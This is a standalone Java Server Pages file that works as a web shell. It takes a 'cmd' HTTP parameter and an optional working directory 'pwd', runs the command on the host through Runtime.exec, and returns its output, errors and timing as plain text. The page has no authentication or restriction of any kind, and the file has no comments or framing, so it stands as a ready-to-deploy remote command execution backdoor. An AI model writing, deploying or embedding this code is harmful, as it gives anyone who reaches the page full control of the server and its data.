<%@ page import="java.io.*"%>
<%@ page import="java.text.SimpleDateFormat"%>
<%@ page import="java.util.*"%>
<%@ page contentType="text/plain" language="java" %>
<%!
    private class ShellCommand
    {
        private String[] _command;
        private String _pwd;
        private StringBuilder _outputStringBuilder = new StringBuilder();
        private String _error;


        ShellCommand(String[] command, String pwd)
        {
            _command = command;
            _pwd = pwd;
            if(Objects.equals(pwd, "") || pwd == null)
            {
                _pwd = System.getenv("EXEC_SHELL_PWD");
                if(_pwd == null || _pwd.equals(""))
                {
                    _pwd = "/";
                }
            }

            if (_command == null || _command.length <= 0)
            {
                _command = new String[]{"ping", "--help"};
            }
        }

        String getPwd()
        {
            return _pwd;
        }

        String getCommand()
        {
            StringBuilder stringBuilder = new StringBuilder();
            for (String s : _command)
            {
                stringBuilder.append(s).append(" ");
            }
            return stringBuilder.toString();
        }

        int executeCommand()
        {
            Runtime runtime = Runtime.getRuntime();
            try
            {
                Process sysProcess = runtime.exec(_command, null, new File(_pwd));
                sysProcess.waitFor();
                BufferedReader stdOut = new BufferedReader(new InputStreamReader(sysProcess.getInputStream()));
                BufferedReader stdError = new BufferedReader(new InputStreamReader(sysProcess.getErrorStream()));
                String s;
                while ((s = stdOut.readLine()) != null)
                {
                    _outputStringBuilder.append(s).append("\n");
                }
                while ((s = stdError.readLine()) != null)
                {
                    _outputStringBuilder.append(s).append("\n");
                }
                return 0;
            }
            catch (IOException e)
            {
                _error = e.toString();
                return -1;
            }
            catch (InterruptedException e)
            {
                _error = e.toString();
                return -2;
            }
        }

        String getError()
        {
            return _error;
        }

        String getOutput()
        {
            return _outputStringBuilder.toString();
        }
    }
%>
<%
    ShellCommand shellCommand;
    PrintWriter outA = response.getWriter();
    Enumeration parameterEnum = request.getParameterNames();
    ArrayList<String> parameterArray = new ArrayList<String>();
    String[] commandSplit;
    String cmd = null;
    String pwd = null;
    while (parameterEnum.hasMoreElements())
    {
        parameterArray.add((String) parameterEnum.nextElement());
    }
    if(!parameterArray.contains("cmd"))
    {
        outA.write("Variable error 0x0000001.\n");
        return;
    }
    cmd = request.getParameter("cmd");
    pwd = request.getParameter("pwd");
    commandSplit = cmd.split("\\s+");
    if (!parameterArray.contains("pwd"))
    {
        shellCommand = new ShellCommand(commandSplit, null);
    }
    else
    {
        shellCommand = new ShellCommand(commandSplit, pwd);
    }
    long execStart = System.nanoTime();
    String execStatus = Integer.toString(shellCommand.executeCommand());
    long execEnd = System.nanoTime();
    long execDurationL = (execEnd - execStart);
    String execDuration = Integer.toString(((int) (((double)execDurationL) /1000000000.0))) + " seconds.";
    String execPwd = shellCommand.getPwd();
    StringBuilder execCommandB = new StringBuilder();
    for (String cmdPart : commandSplit) {
        execCommandB.append(cmdPart).append(" ");
    }
    String execTime = new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime());
    String execCmd = execCommandB.toString();
    String execError = shellCommand.getError();
    String execOutput = shellCommand.getOutput();

    StringBuilder outputBuilder = new StringBuilder();
    outputBuilder.append("Execution Status: ").append(execStatus).append("\n")
    .append("Executed Duration: ").append(execDuration).append("\n")
    .append("Executed Time (HH:mm:ss): ").append(execTime).append("\n")
    .append("Executed Path: ").append(execPwd).append("\n")
    .append("Executed Command: ").append(execCmd).append("\n")
    .append("Executed Error (If Any): ").append(execError).append("\n")
    .append("------------------------------------------------------------------------------\n\n\n")
    .append(execOutput);
    outA.write(outputBuilder.toString());
%>